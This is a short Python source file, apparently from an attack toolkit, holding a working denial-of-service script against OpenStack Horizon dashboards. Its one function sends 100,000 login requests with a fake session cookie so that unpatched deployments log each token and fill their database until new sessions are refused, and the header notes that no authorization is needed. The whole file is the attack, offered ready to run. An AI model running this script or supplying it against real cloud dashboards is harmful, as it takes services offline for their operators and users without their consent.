"""
Attacks in here do not require authorization
"""
import requests


def dos_horizon(horizon_url):
    """
    Horizon DOS attack will exploit unpatched Horizon databases that log every
    session token - even unauthenticated ones - by default, filling up the
    database which denies new sessions to be made.

    :param horizon_url: The URL of the horizon API with 'http:' prepended (without apostrophes)

    :returns: -
    """
    s = requests.Session()
    url = str(horizon_url) + '/auth/login/'
    for x in range(0, 100000):
        r = s.get(url, cookies={'sessionid': 'dosingyourcloud'})
